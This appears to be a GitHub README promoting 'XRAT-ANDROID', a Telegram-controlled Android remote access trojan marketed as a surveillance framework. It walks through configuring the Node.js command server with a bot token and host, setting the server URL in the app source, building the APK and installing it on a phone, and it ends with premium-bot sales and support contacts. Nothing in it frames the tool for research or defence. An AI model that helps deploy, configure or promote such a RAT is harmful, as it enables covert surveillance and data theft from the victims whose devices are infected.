<h1 align="center">
<img src="https://readme-typing-svg.herokuapp.com/?font=Microsoft&size=28&duration=4000&color=FF0000&center=true&vCenter=true&width=500&lines=XRAT-ANDROID+2025;GHOST+HVNC;Telegram+Based+RAT" alt="XRAT-ANDROID Title">
</h1>

<div align="center">

---
![image](https://github.com/user-attachments/assets/da48188b-6ee3-4bee-93b8-6a6ff1f25193)
---

**Advanced Android Surveillance Framework**

![Version](https://github.com/user-attachments/assets/76cffd3f-0b8c-49e8-ae7b-4fabe87bc197)
![Android](https://img.shields.io/badge/Android-8.0+-00FF00?style=flat-square)

</div>

---

## 🚀 Project Structure

**Two main components:**
1. 🌐 Web Server (Node.js)
2. 📱 Android App (built via build.sh)

---

---
## 🛠 System Requirements

### 🌐 Server Requirements
* Node.js (v22 or newer)
* npm (comes with Node.js)
* Telegram Bot Token and Chat ID
* Server or hosting platform

### 📱 App Requirements
* Linux or WSL
* Java JDK * Java JDK 11 or newer
* Android SDK
* Gradle
* (Optional) ADB for installing APK

---

## 🌐 Server Setup

### 1. Install Dependencies
```bash
npm install
```

2. Configure Server

Edit the index.js file:

```javascript
const token = "";        // Bot Token
const chatId = "";       // Chat ID
const host = "";         // Server Host
const PORT = 3000;       // Port
```

3. Start Server

```bash
node index.js
```

4. (Optional) Run in Background

```bash
npm install -g pm2
pm2 start index.js
```

---

📱 App Setup

1. Configure Server URL

Open the file:
app/src/main/java/com/yiwugou/yiwukanz/MainService.java

Find and modify:

```java
public static final String serverUrl = ""; // Change your URL here
```

2. Build APK

```bash
chmod +x build.sh
./build.sh
```

3. Install App

```bash
adb install app/build/outputs/apk/release/app-release.apk
```

Or manually copy the APK to your phone

---

📞 Contact Support

Premium Bot: @xrat-android_bot
Official Channel: @xratandroidofficial
Technical Support: @xratandroidsupport

---

<div align="center">

XRAT-ANDROID 2025 - Redefining Mobile Surveillance

</div>

